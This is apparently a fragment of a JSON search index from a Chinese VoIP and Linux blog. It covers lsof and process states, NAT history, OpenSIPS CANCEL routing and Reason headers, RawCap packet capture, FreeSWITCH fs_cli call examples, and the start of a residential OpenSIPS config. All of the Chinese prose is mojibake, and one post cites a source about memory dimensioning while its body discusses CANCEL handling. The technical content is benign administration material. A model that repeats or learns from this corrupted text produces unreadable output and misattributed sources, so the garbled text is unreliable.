è¿›ç¨‹æ‰€æœ‰éœ€è¦çš„èµ„æºéƒ½å·²ç»å°±ç»ªï¼Œç­‰å¾…è¿›å…¥CPUæ‰§è¡Œ blocked è¿›ç¨‹è¢«æŸäº›äº‹ä»¶é˜»æ–­ï¼Œä¾‹å¦‚IOã€‚ è¿›ç¨‹çš„çŠ¶æ€è½¬ç§»å›¾\nè¿›ç¨‹éƒ½æœ‰æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ ä½¿ç”¨lsofå‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹æŸä¸ªè¿›ç¨‹æ‰€æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦\n/proc/pid/fd/ç›®å½•ä¸‹ä¹Ÿæœ‰æ–‡ä»¶æè¿°ç¬¦\nlsof -c è¿›ç¨‹ålsof -p è¿›ç¨‹å·lsof filename # æŸ¥çœ‹æŸä¸ªæ–‡ä»¶è¢«å“ªä¸ªè¿›ç¨‹æ‰“å¼€**\n[root@localhost ~]# lsof -c rtpproxy COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME rtpproxy 2073 root cwd DIR 253,0 4096 128 / rtpproxy 2073 root rtd DIR 253,0 4096 128 / rtpproxy 2073 root txt REG 253,0 933247 18295252 /usr/local/bin/rtpproxy rtpproxy 2073 root mem REG 253,0 2127336 33617010 /usr/lib64/libc-2.","title":"Linuxè¿›ç¨‹å’Œçº¿ç¨‹"},{"content":"æœ€è¿‘æ„Ÿè§‰æå‰æ­¥å…¥è€å¹´ç”Ÿæ´»ï¼Œæ™šä¸Šä¹ç‚¹ç¡è§‰ï¼Œæ—©ä¸Šå…­ç‚¹é†’æ¥ã€‚é†’æ¥ä¹‹åæ‰“ç›¹ä¸€ä¼šï¼Œç­‰ç€æŒ‰ç­å…­ç‚¹ååˆ†çš„é—¹é’Ÿã€‚\nå“ï¼Œåˆå›°äº†ã€‚ğŸ˜©ğŸ˜©ğŸ˜©ğŸ˜©ğŸ˜©ğŸ˜©\n","permalink":"https://wdd.js.org/posts/2020/04/ysx4gz/","summary":"æœ€è¿‘æ„Ÿè§‰æå‰æ­¥å…¥è€å¹´ç”Ÿæ´»ï¼Œæ™šä¸Šä¹ç‚¹ç¡è§‰ï¼Œæ—©ä¸Šå…­ç‚¹é†’æ¥ã€‚é†’æ¥ä¹‹åæ‰“ç›¹ä¸€ä¼šï¼Œç­‰ç€æŒ‰ç­å…­ç‚¹ååˆ†çš„é—¹é’Ÿã€‚\nå“ï¼Œåˆå›°äº†ã€‚ğŸ˜©ğŸ˜©ğŸ˜©ğŸ˜©ğŸ˜©ğŸ˜©","title":"è€å¹´ç”Ÿæ´»"},{"content":"æœ€è¿‘éœ€è¦æ‹›ä¸ªå‰ç«¯å¼€å‘ï¼Œæˆ‘æ›´æƒ³è®©ä»–å‘Nodejsæ–¹é¢å‘å±•ã€‚\nç®€å†çœ‹çš„çœ¼èŠ±ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰é‚£ä¹ˆå¤šäººéƒ½åœ¨ç®€å†ä¸Šå†™åƒè‹¦éš¾è€ï¼Œéš¾é“åšå‰ç«¯å¼€å‘çœŸçš„éœ€è¦åƒè‹¦è€åŠ³å—ï¼Ÿ\næˆ‘åœ¨NPMä¸Šæ²¡æœ‰æ‰¾åˆ°èƒ½æ”¶é‚®ä»¶çš„åŒ…ï¼Œæ‰¾åˆ°äº†å‘é‚®ä»¶çš„åŒ…ã€‚\næˆ‘æƒ³æ‰¾ä¸ªèƒ½æ”¶é‚®ä»¶çš„åŒ…ï¼Œè‡ªåŠ¨æ”¶é‚®ä»¶ï¼Œè‡ªåŠ¨åˆ†æå’Œè¿‡æ»¤ä¸€äº›ä¸æƒ³çœ‹çš„ç®€å†ã€‚\n","permalink":"https://wdd.js.org/posts/2020/04/oczker/","summary":"æœ€è¿‘éœ€è¦æ‹›ä¸ªå‰ç«¯å¼€å‘ï¼Œæˆ‘æ›´æƒ³è®©ä»–å‘Nodejsæ–¹é¢å‘å±•ã€‚\nç®€å†çœ‹çš„çœ¼èŠ±ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰é‚£ä¹ˆå¤šäººéƒ½åœ¨ç®€å†ä¸Šå†™åƒè‹¦éš¾è€ï¼Œéš¾é“åšå‰ç«¯å¼€å‘çœŸçš„éœ€è¦åƒè‹¦è€åŠ³å—ï¼Ÿ\næˆ‘åœ¨NPMä¸Šæ²¡æœ‰æ‰¾åˆ°èƒ½æ”¶é‚®ä»¶çš„åŒ…ï¼Œæ‰¾åˆ°äº†å‘é‚®ä»¶çš„åŒ…ã€‚\næˆ‘æƒ³æ‰¾ä¸ªèƒ½æ”¶é‚®ä»¶çš„åŒ…ï¼Œè‡ªåŠ¨æ”¶é‚®ä»¶ï¼Œè‡ªåŠ¨åˆ†æå’Œè¿‡æ»¤ä¸€äº›ä¸æƒ³çœ‹çš„ç®€å†ã€‚","title":"ç®€å†ä¹‹åƒè‹¦è€åŠ³"},{"content":" å›éŸ³ç°è±¡ è¯´è¯äººèƒ½åœ¨éº¦å…‹é£ä¸­å¬åˆ°è‡ªå·±çš„è¯´è¯å£°ã€‚\nå›éŸ³çš„å¯èƒ½åŸå›  æœ‰çš„å¼€å‘ï¼Œå–œæ¬¢ç”¨åˆ†æœºæ‰“è‡ªå·±çš„å·ç ï¼Œä½ åˆ†æœºå’Œä½ çš„æ‰‹æœºç¦»å¾—å¤ªè¿‘ï¼Œè‡ªç„¶å›äº§ç”Ÿå›éŸ³çš„ã€‚ å‚è€ƒèµ„æ–™ http://www.voiptroubleshooter.com/problems/echo.html https://www.lifewire.com/how-to-stop-producing-echo-3426515 https://www.voipmechanic.com/voip-top-5-complaints.htm https://getvoip.com/blog/2012/12/18/the-biggest-causes-behind-echo-in-voip/ https://blog.csdn.net/huoppo/article/details/6643066 ","permalink":"https://wdd.js.org/opensips/ch7/echo-back/","summary":" å›éŸ³ç°è±¡ è¯´è¯äººèƒ½åœ¨éº¦å…‹é£ä¸­å¬åˆ°è‡ªå·±çš„è¯´è¯å£°ã€‚\nå›éŸ³çš„å¯èƒ½åŸå›  æœ‰çš„å¼€å‘ï¼Œå–œæ¬¢ç”¨åˆ†æœºæ‰“è‡ªå·±çš„å·ç ï¼Œä½ åˆ†æœºå’Œä½ çš„æ‰‹æœºç¦»å¾—å¤ªè¿‘ï¼Œè‡ªç„¶å›äº§ç”Ÿå›éŸ³çš„ã€‚ å‚è€ƒèµ„æ–™ http://www.voiptroubleshooter.com/problems/echo.html https://www.lifewire.com/how-to-stop-producing-echo-3426515 https://www.voipmechanic.com/voip-top-5-complaints.htm https://getvoip.com/blog/2012/12/18/the-biggest-causes-behind-echo-in-voip/ https://blog.csdn.net/huoppo/article/details/6643066 ","title":"å›éŸ³é—®é¢˜è°ƒç ”"},{"content":"è®¾æƒ³ä¸€ä¸‹ï¼Œå¦‚æœå›½å®¶è§„å®šï¼Œç»™å­©å­èµ·åå­—çš„æ—¶å€™ï¼Œä¸èƒ½å’Œå·²ç»ä½¿ç”¨è¿‡çš„æ´»ç€çš„äººåå­—ç›¸åŒï¼Œä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Ÿ\né™¤éæŠŠåå­—èµ·å¾—è¶Šæ¥è¶Šé•¿ï¼Œå¦åˆ™åå­—å¾ˆå¿«å°±ä¸å¤Ÿç”¨äº†ã€‚\nåœ¨ 1993 å¹´çš„æ—¶å€™ï¼Œæœ‰äººå°±é‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œå› ä¸º IP åœ°å€å¿«è¢«ç”¨å®Œäº†ã€‚\nä»–ä»¬æƒ³å‡ºä¸¤ä¸ªæ–¹æ¡ˆï¼š\nçŸ­æœŸæ–¹æ¡ˆï¼šCIDR(Classless InterDomain Routing) é•¿æœŸæ–¹æ¡ˆï¼šå¼€å‘æ–°çš„å…·æœ‰æ›´å¤§åœ°å€ç©ºé—´çš„äº’è”ç½‘åè®®ã€‚å¯ä»¥è®¤ä¸ºæ˜¯ç›®å‰çš„ IPv6 å½“ç„¶äº†é•¿æœŸæ–¹æ¡ˆä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼ŒçŸ­æœŸæ–¹æ¡ˆæ‰æ˜¯è§£å†³çœ¼å‰é—®é¢˜çš„æ–¹æ¡ˆã€‚\na very small percentage of hosts in a stub domain are communicating outside of the domain at any given time\nçŸ­æœŸçš„æ–¹æ¡ˆåŸºäºä¸€ä¸ªé€»è¾‘äº‹å®ï¼šåœ¨ä¸€ä¸ªç½‘ç»œä¸­ï¼Œåªæœ‰éå¸¸å°‘çš„å‡ ä¸ªä¸»æœºéœ€è¦è·Ÿå¤–éƒ¨ç½‘ç»œäº¤æµã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¤§éƒ¨åˆ†çš„ä¸»æœºéƒ½åœ¨å†…éƒ¨äº¤æµã€‚é‚£ä¹ˆå†…éƒ¨äº¤æµçš„è¿™äº›ä¸»æœºï¼Œå®é™…ä¸Šå¹¶ä¸éœ€è¦ç»™è®¾ç½®å…¬ç½‘ IPã€‚ï¼ˆä½†æ˜¯è¿™ä¸ªåªæ˜¯ 1993 å¹´çš„é‚£ä¸ªæ—¶æœŸçš„äº‹å®ï¼‰**å¯ä»¥ç±»æ¯”äºï¼Œç­çº§å†…éƒ¨ä¹‹é—´çš„å­¦ç”Ÿäº¤æµå¾ˆå¤šã€‚ç­çº§ä¸ç­çº§ä¹‹é—´çš„äº¤æµï¼Œä¼°è®¡åªæœ‰ç­é•¿ä¹‹é—´äº¤æµã€‚\nå‚è€ƒ https://tools.ietf.org/html/rfc1631 https://tools.ietf.org/html/rfc1996 https://tools.ietf.org/html/rfc2663 https://tools.ietf.org/html/rfc2993 ","permalink":"https://wdd.js.org/opensips/ch1/story-of-nat/","summary":"è®¾æƒ³ä¸€ä¸‹ï¼Œå¦‚æœå›½å®¶è§„å®šï¼Œç»™å­©å­èµ·åå­—çš„æ—¶å€™ï¼Œä¸èƒ½å’Œå·²ç»ä½¿ç”¨è¿‡çš„æ´»ç€çš„äººåå­—ç›¸åŒï¼Œä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Ÿ\né™¤éæŠŠåå­—èµ·å¾—è¶Šæ¥è¶Šé•¿ï¼Œå¦åˆ™åå­—å¾ˆå¿«å°±ä¸å¤Ÿç”¨äº†ã€‚\nåœ¨ 1993 å¹´çš„æ—¶å€™ï¼Œæœ‰äººå°±é‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œå› ä¸º IP åœ°å€å¿«è¢«ç”¨å®Œäº†ã€‚\nä»–ä»¬æƒ³å‡ºä¸¤ä¸ªæ–¹æ¡ˆï¼š\nçŸ­æœŸæ–¹æ¡ˆï¼šCIDR(Classless InterDomain Routing) é•¿æœŸæ–¹æ¡ˆï¼šå¼€å‘æ–°çš„å…·æœ‰æ›´å¤§åœ°å€ç©ºé—´çš„äº’è”ç½‘åè®®ã€‚å¯ä»¥è®¤ä¸ºæ˜¯ç›®å‰çš„ IPv6 å½“ç„¶äº†é•¿æœŸæ–¹æ¡ˆä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼ŒçŸ­æœŸæ–¹æ¡ˆæ‰æ˜¯è§£å†³çœ¼å‰é—®é¢˜çš„æ–¹æ¡ˆã€‚\na very small percentage of hosts in a stub domain are communicating outside of the domain at any given time\nçŸ­æœŸçš„æ–¹æ¡ˆåŸºäºä¸€ä¸ªé€»è¾‘äº‹å®ï¼šåœ¨ä¸€ä¸ªç½‘ç»œä¸­ï¼Œåªæœ‰éå¸¸å°‘çš„å‡ ä¸ªä¸»æœºéœ€è¦è·Ÿå¤–éƒ¨ç½‘ç»œäº¤æµã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¤§éƒ¨åˆ†çš„ä¸»æœºéƒ½åœ¨å†…éƒ¨äº¤æµã€‚é‚£ä¹ˆå†…éƒ¨äº¤æµçš„è¿™äº›ä¸»æœºï¼Œå®é™…ä¸Šå¹¶ä¸éœ€è¦ç»™è®¾ç½®å…¬ç½‘ IPã€‚ï¼ˆä½†æ˜¯è¿™ä¸ªåªæ˜¯ 1993 å¹´çš„é‚£ä¸ªæ—¶æœŸçš„äº‹å®ï¼‰**å¯ä»¥ç±»æ¯”äºï¼Œç­çº§å†…éƒ¨ä¹‹é—´çš„å­¦ç”Ÿäº¤æµå¾ˆå¤šã€‚ç­çº§ä¸ç­çº§ä¹‹é—´çš„äº¤æµï¼Œä¼°è®¡åªæœ‰ç­é•¿ä¹‹é—´äº¤æµã€‚\nå‚è€ƒ https://tools.ietf.org/html/rfc1631 https://tools.ietf.org/html/rfc1996 https://tools.ietf.org/html/rfc2663 https://tools.ietf.org/html/rfc2993 ","title":"æ¼«è¯NATçš„å†å²todo"},{"content":"åŸæ–‡ï¼šhttps://blog.opensips.org/2016/12/29/understanding-and-dimensioning-memory-in-opensips/\nCall canceling may look like a trivial mechanism, but it plays an important role in complex scenarios like simultaneous ringing (parallel forking), call pickup, call redirect and many others. So, aside proper routing of CANCEL requests, reporting the right cancelling reason is equally important.\nå¦‚ä½•æ­£ç¡®çš„å¤„ç†cancelè¯·æ±‚ï¼Ÿ According to RFC 3261,** a CANCEL must be route to the exact same destination (IP, port, protocol) and with the same exact Request-URI as the INVITE it is canceling**. This is required in order to guarantee that the CANCEL will end up (via the same SIP route) in the same place as the INVITE.So, the CANCEL must follow up the INVITE. But how to do and script this?\nIf you run OpenSIPS in a stateless mode, there is no other way then taking care of this at script level â€“ apply the same dialplan and routing decisions for the CANCEL as you did for the INVITE. As stateless proxies usually have simple logic, this is not something difficult to do.\nBut what if the routing logic is complex, involving factorsÂ that make it hard to reproduce when handling the CANCEL? For example, the INVITE routing may depend on time conditions or dynamic data (that may change at any time).\nIn such cases, you must rely on a stateful routing (SIP transaction based). Basically the transaction engine in OpenSIPS will store and remember the information on where and how the INVITE was routed, so there is not need to â€œreproduceâ€ that for the CANCEL request â€“ you just fetch it from the transaction context. So, all the heavy lifting is done by the TM (transaction) module â€“ you just have to invoke it:\nif ( is_method(\u0026#34;CANCEL\u0026#34;) ) { t_relay(); exit; } As you can see, there is no need to do any explicit routing for CANCEL requests â€“ you just ask TM module to do it for you â€“ as soon as the module sees you try to route a CANCEL,** it will automatically fetch the needed information from the INVITE transaction and set the proper routing **â€“ all this magic happens inside the t_relay() function.\nNow, OpenSIPS is a multi-process application and INVITE requests may take time to be routed (due complex logic involving external queries or I/Os like DB, REST or others). So, you may end up with OpenSIPS handing the INVITE request in one process (for some time) while the corresponding CANCEL request starts being handled in another process. This may lead to some race conditions â€“ if the INVITE is not yet processed and routed out, how will OpenSIPS know what to do with the CANCEL??\nå¤šè¿›ç¨‹æ¨¡å¼ä¸‹çš„INVITEå’ŒCANCELå¯èƒ½ä¼šå¯¼è‡´æ¡ä»¶ç«äº‰\nWell, if you cannot solve a race condition, better avoid it :). How? Postpone the CANCEL processing until the INVITE is done and routed. How? If there is no transaction created yet for the INVITE, avoid handling the CANCEL by simply dropping it â€“ no worries, we will not lose the CANCEL as by dropping it, we will force the caller device to resend it over again.\nSo, we enhanceÂ our CANCEL scripting byÂ checking for the INVITE transaction â€“ this can be done via the t_check_trans() function. If we do not find the INVITE transaction, simple exit to drop the CANCEL request:\nif ( is_method(\u0026#34;CANCEL\u0026#34;) ) { if ( t_check_trans() ) t_relay(); exit; } å¦‚ä½•æ§åˆ¶CANCELè¯·æ±‚Reasonå¤´ï¼Ÿ Propagating a correct Reason info in the CANCEL requests is equally important. For example, depending on the Reason for the canceled incoming call, a callee device may report it as a missed call (if the Reason header indicates a caller cancelling) or not (if the Reason header indicates that the call has established somewhere else, due to parallel forking).\nSo, you need to pay attention to propagating or inserting the Reason info into the CANCEL requests!For CANCEL requests built by OpenSIPS , the Reason header is inserted all the time, in order to reflect the reason for generating the CANCEL:\nSIP;cause=480;text=â€NO_ANSWERâ€ â€“ if the cancelling was a result of an INVITE timeout; SIP;cause=200;text=â€Call completed elsewhereâ€ â€“ if the cancelling was due to parallel forking (another branch of the call was answered); SIP;cause=487;text=â€ORIGINATOR_CANCELâ€ â€“ if the cancelling was received from a previous SIP hop (due an incoming CANCEL). So,** by default, OpenSIPS will discard the Reason info for the CANCEL requests that are received and relayed further** (and force the â€œORIGINATOR_CANCELâ€ reason). But there are many cases when you want to keep and propagate further the incoming Reason header. To do that, you need to set the â€œ0x08â€ flag when calling the t_relay() function for the CANCEL:\nif ( is_method(\u0026#34;CANCEL\u0026#34;) ) { if ( t_check_trans() ) # preserve the received Reason header t_relay(\u0026#34;8\u0026#34;); exit; } If there is no Reason in the incoming CANCEL, the default one will be inserted by OpenSIPS in the outgoing CANCEL.Even more, starting with the 2.3 version, OpenSIPS allows you to inject your own Reason header, by using the t_add_cancel_reason() function:\nif ( is_method(\u0026#34;CANCEL\u0026#34;) ) { if ( t_check_trans() ) { t_add_cancel_reason(\u0026#39;Reason: SIP ;cause=200;text=\u0026#34;Call completed elsewhere\u0026#34;\\r\\n\u0026#39;); t_relay(); } exit; } This function gives you full control over the Reason header and allows various implementation of complex scenarios, especially SBC and front-end like.\n","permalink":"https://wdd.js.org/opensips/blog/cancel-reason/","summary":"åŸæ–‡ï¼šhttps://blog.opensips.org/2016/12/29/understanding-and-dimensioning-memory-in-opensips/\nCall canceling may look like a trivial mechanism, but it plays an important role in complex scenarios like simultaneous ringing (parallel forking), call pickup, call redirect and many others. So, aside proper routing of CANCEL requests, reporting the right cancelling reason is equally important.\nå¦‚ä½•æ­£ç¡®çš„å¤„ç†cancelè¯·æ±‚ï¼Ÿ According to RFC 3261,** a CANCEL must be route to the exact same destination (IP, port, protocol) and with the same exact Request-URI as the INVITE it is canceling**.","title":"CANCELè¯·æ±‚å’ŒReasonå¤´"},{"content":"ç›¸æ¯”äºwireshark, RawCapéå¸¸å°ï¼Œä»…æœ‰48kbã€‚\nä½¿ç”¨RawCapå‘½ä»¤éœ€è¦ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€CMDï¼Œç„¶åè¿›å…¥åˆ°RawCap.exeçš„ç›®å½•ã€‚ä¾‹å¦‚F:\\Tools\næ˜¾ç¤ºç½‘å¡åˆ—è¡¨ è¾“å…¥RawCap.exe \u0026ndash;help, å¯ä»¥æ˜¾ç¤ºå‘½ä»¤çš„ä½¿ç”¨å¸®åŠ©ã€ç½‘å¡åˆ—è¡¨è¿˜æœ‰ä½¿ç”¨ä¾‹å­ã€‚\nF:\\Tools\u0026gt;RawCap.exe --help NETRESEC RawCap version 0.2.0.0 Usage: RawCap.exe [OPTIONS] \u0026lt;interface\u0026gt; \u0026lt;pcap_target\u0026gt; \u0026lt;interface\u0026gt; can be an interface number or IP address \u0026lt;pcap_target\u0026gt; can be filename, stdout (-) or named pipe (starting with \\\\.\\pipe\\) OPTIONS: -f Flush data to file after each packet (no buffer) -c \u0026lt;count\u0026gt; Stop sniffing after receiving \u0026lt;count\u0026gt; packets -s \u0026lt;sec\u0026gt; Stop sniffing after \u0026lt;sec\u0026gt; seconds -m Disable automatic creation of RawCap firewall entry -q Quiet, don\u0026#39;t print packet count to standard out INTERFACES: 0. IP : 169.254.63.243 NIC Name : Local Area Connection NIC Type : Ethernet 1. IP : 192.168.1.129 NIC Name : WiFi NIC Type : Wireless80211 2. IP : 127.0.0.1 NIC Name : Loopback Pseudo-Interface 1 NIC Type : Loopback 3. IP : 10.165.240.132 NIC Name : Mobile 12 NIC Type : Wwanpp Example 1: RawCap.exe 0 dumpfile.pcap Example 2: RawCap.exe -s 60 127.0.0.1 localhost.pcap Example 3: RawCap.exe 127.0.0.1 \\\\.\\pipe\\RawCap Example 4: RawCap.exe -q 127.0.0.1 - | Wireshark.exe -i - -k :::warning æ³¨æ„ï¼š\næ‰§è¡ŒRawCap.exeçš„æ—¶å€™ï¼Œä¸è¦ç”¨ ./RawCap.exe , ç›´æ¥ç”¨æ–‡ä»¶å RawCap.exe åŠ æ‰§è¡Œå‚æ•° RawCapçš„åŠŸèƒ½å¾ˆå¼±ï¼Œæ²¡æœ‰åŒ…è¿‡æ»¤ã€‚åªèƒ½æŒ‡å®šç½‘å¡æŠ“åŒ…ï¼Œç„¶åä¿å­˜ä¸ºæ–‡ä»¶ã€‚ ::: æŠ“æŒ‡å®šç½‘å¡çš„åŒ… Example 1: RawCap.exe 0 dumpfile.pcap Example 2: RawCap.exe -s 60 127.0.0.1 localhost.pcap Example 3: RawCap.exe 127.0.0.1 \\\\.\\pipe\\RawCap Example 4: RawCap.exe -q 127.0.0.1 - | Wireshark.exe -i - -k å‚è€ƒ https://www.netresec.com/?page=RawCap\né™„ä»¶ é™„ä»¶ä¸­æœ‰ä¸¤ä¸ªç‰ˆæœ¬çš„rawcapæ–‡ä»¶ã€‚\nraw-cap.zip ","permalink":"https://wdd.js.org/posts/2020/04/pfkelh/","summary":"ç›¸æ¯”äºwireshark, RawCapéå¸¸å°ï¼Œä»…æœ‰48kbã€‚\nä½¿ç”¨RawCapå‘½ä»¤éœ€è¦ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€CMDï¼Œç„¶åè¿›å…¥åˆ°RawCap.exeçš„ç›®å½•ã€‚ä¾‹å¦‚F:\\Tools\næ˜¾ç¤ºç½‘å¡åˆ—è¡¨ è¾“å…¥RawCap.exe \u0026ndash;help, å¯ä»¥æ˜¾ç¤ºå‘½ä»¤çš„ä½¿ç”¨å¸®åŠ©ã€ç½‘å¡åˆ—è¡¨è¿˜æœ‰ä½¿ç”¨ä¾‹å­ã€‚\nF:\\Tools\u0026gt;RawCap.exe --help NETRESEC RawCap version 0.2.0.0 Usage: RawCap.exe [OPTIONS] \u0026lt;interface\u0026gt; \u0026lt;pcap_target\u0026gt; \u0026lt;interface\u0026gt; can be an interface number or IP address \u0026lt;pcap_target\u0026gt; can be filename, stdout (-) or named pipe (starting with \\\\.\\pipe\\) OPTIONS: -f Flush data to file after each packet (no buffer) -c \u0026lt;count\u0026gt; Stop sniffing after receiving \u0026lt;count\u0026gt; packets -s \u0026lt;sec\u0026gt; Stop sniffing after \u0026lt;sec\u0026gt; seconds -m Disable automatic creation of RawCap firewall entry -q Quiet, don\u0026#39;t print packet count to standard out INTERFACES: 0.","title":"windowè½»é‡çº§æŠ“åŒ…å·¥å…·RawCapä»‹ç»"},{"content":"\n1. è®¾ç½®æ—¥å¿—çº§åˆ« æ¯ä¸ªå¿«æ·é”®å¯¹åº”ä¸€ä¸ªåŠŸèƒ½ï¼Œå…·ä½“é…ç½®ä½äº /conf/autoload_configs/switch.conf.xml\nF1. help F2. status F3. show channels F4. show calls F5. sofia status F6. reloadxml F7. console loglevel 0 F8. console loglevel 7 F9. sofia status profile internal F10. sofia profile intrenal siptrace on F11. sofia profile internal siptrace off F12. version 2. å‘èµ·å‘¼å«ç›¸å…³ ä¸‹é¢çš„å‘½ä»¤éƒ½æ˜¯åŒæ­¥çš„å‘½ä»¤ï¼Œå¯ä»¥åœ¨æ‰€æœ‰å‘½ä»¤å‰åŠ bgapiå‘½ä»¤ï¼Œè®©originateå‘½ä»¤åå°å¼‚æ­¥æ‰§è¡Œã€‚\n2.1 å›éŸ³æµ‹è¯• originate user/1000 \u0026amp;echo 2.2 åœæ³Š originate user/1000 \u0026amp;park # åœæ³Š 2.3 ä¿æŒ originate user/1000 \u0026amp;hold # ä¿æŒ 2.4 æ’­æ”¾æ”¾éŸ³ originate user/1000 \u0026amp;playback(/root/welclome.wav) # æ’­æ”¾éŸ³ä¹ 2.5 å‘¼å«å¹¶å½•éŸ³ originate user/1000 \u0026amp;record(/tmp/vocie_of_alice.wav) # å‘¼å«å¹¶å½•éŸ³ 2.6 åŒæŒ¯ä¸é¡ºæŒ¯ #ç»è¿‡ç‰¹å®šçš„SIPæœåŠ¡å™¨å‘èµ·å¤–å‘¼ï¼Œä¸‹é¢çš„å‘½ä»¤ä¼šå°†INVITEå…ˆå‘é€åˆ°192.168.2.4:5060ä¸Š bgapi originate sofia/external/8005@001.com;fs_path=sip:192.168.2.4:5060 \u0026amp;echo 2.7 ç»è¿‡ç‰¹å®šSIPæœåŠ¡å™¨ #ç»è¿‡ç‰¹å®šçš„SIPæœåŠ¡å™¨å‘èµ·å¤–å‘¼ï¼Œä¸‹é¢çš„å‘½ä»¤ä¼šå°†INVITEå…ˆå‘é€åˆ°192.168.2.4:5060ä¸Š bgapi originate sofia/external/8005@001.com;fs_path=sip:192.168.2.4:5060 \u0026amp;echo 2.8 å¿½ç•¥early media originate {ignore_early_media=true}user/1000 \u0026amp;echo 2.9 æ’­æ”¾å‡çš„early media originate {transfer_ringback=local_stream://moh}user/1000 \u0026amp;echo 2.10 ç«‹å³æ’­æ”¾early media originate {instant_ringback=true}{transfer_ringback=local_stream://moh}user/1000 \u0026amp;echo 2.11 è®¾ç½®å¤–æ˜¾å·ç  originate {origination_callee_id_name=7777}user/1000 é€šé“å˜é‡å°†å½±å“å‘¼å«çš„è¡Œä¸ºã€‚fsçš„é€šé“å˜é‡éå¸¸å¤šï¼Œå°±ä¸å†ä¸€ä¸€åˆ—ä¸¾ã€‚å…·ä½“å¯ä»¥å‚è€ƒã€‚ä¸‹é¢çš„é“¾æ¥\nhttps://freeswitch.org/confluence/display/FREESWITCH/Channel+Variables#app-switcher https://freeswitch.org/confluence/display/FREESWITCH/Channel+Variables+Catalog ","permalink":"https://wdd.js.org/freeswitch/fs-cli-example/","summary":"1. è®¾ç½®æ—¥å¿—çº§åˆ« æ¯ä¸ªå¿«æ·é”®å¯¹åº”ä¸€ä¸ªåŠŸèƒ½ï¼Œå…·ä½“é…ç½®ä½äº /conf/autoload_configs/switch.conf.xml\nF1. help F2. status F3. show channels F4. show calls F5. sofia status F6. reloadxml F7. console loglevel 0 F8. console loglevel 7 F9. sofia status profile internal F10. sofia profile intrenal siptrace on F11. sofia profile internal siptrace off F12. version 2. å‘èµ·å‘¼å«ç›¸å…³ ä¸‹é¢çš„å‘½ä»¤éƒ½æ˜¯åŒæ­¥çš„å‘½ä»¤ï¼Œå¯ä»¥åœ¨æ‰€æœ‰å‘½ä»¤å‰åŠ bgapiå‘½ä»¤ï¼Œè®©originateå‘½ä»¤åå°å¼‚æ­¥æ‰§è¡Œã€‚\n2.1 å›éŸ³æµ‹è¯• originate user/1000 \u0026amp;echo 2.2 åœæ³Š originate user/1000 \u0026amp;park # åœæ³Š 2.3 ä¿æŒ originate user/1000 \u0026amp;hold # ä¿æŒ 2.4 æ’­æ”¾æ”¾éŸ³ originate user/1000 \u0026amp;playback(/root/welclome.","title":"fs_cli ä¾‹å­"},{"content":"# # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=3 log_stderror=no log_facility=LOG_LOCAL0 children=4 /* uncomment the following lines to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on reverse DNS on IPs */ auto_aliases=no listen=udp:127.0.0.1:5060 # CUSTOMIZE ME ####### Modules Section ######## #set module path mpath=\u0026#34;/usr/local//lib/opensips/modules/\u0026#34; #### SIGNALING module loadmodule \u0026#34;signaling.so\u0026#34; #### StateLess module loadmodule \u0026#34;sl.so\u0026#34; #### Transaction Module loadmodule \u0026#34;tm.so\u0026#34; modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_timeout\u0026#34;, 5) modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_inv_timeout\u0026#34;, 30) modparam(\u0026#34;tm\u0026#34;, \u0026#34;restart_fr_on_each_reply\u0026#34;, 0) modparam(\u0026#34;tm\u0026#34;, \u0026#34;onreply_avp_mode\u0026#34;, 1) #### Record Route Module loadmodule \u0026#34;rr.so\u0026#34; /* do not append from tag to the RR (no need for this script) */ modparam(\u0026#34;rr\u0026#34;, \u0026#34;append_fromtag\u0026#34;, 0) #### MAX ForWarD module loadmodule \u0026#34;maxfwd.so\u0026#34; #### SIP MSG OPerationS module loadmodule \u0026#34;sipmsgops.so\u0026#34; #### FIFO Management Interface loadmodule \u0026#34;mi_fifo.so\u0026#34; modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_mode\u0026#34;, 0666) #### URI module loadmodule \u0026#34;uri.so\u0026#34; modparam(\u0026#34;uri\u0026#34;, \u0026#34;use_uri_table\u0026#34;, 0) #### USeR LOCation module loadmodule \u0026#34;usrloc.so\u0026#34; modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;nat_bflag\u0026#34;, \u0026#34;NAT\u0026#34;) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;working_mode_preset\u0026#34;, \u0026#34;single-instance-no-db\u0026#34;) #### REGISTRAR module loadmodule \u0026#34;registrar.so\u0026#34; modparam(\u0026#34;registrar\u0026#34;, \u0026#34;tcp_persistent_flag\u0026#34;, \u0026#34;TCP_PERSISTENT\u0026#34;) /* uncomment the next line not to allow more than 10 contacts per AOR */ #modparam(\u0026#34;registrar\u0026#34;, \u0026#34;max_contacts\u0026#34;, 10) 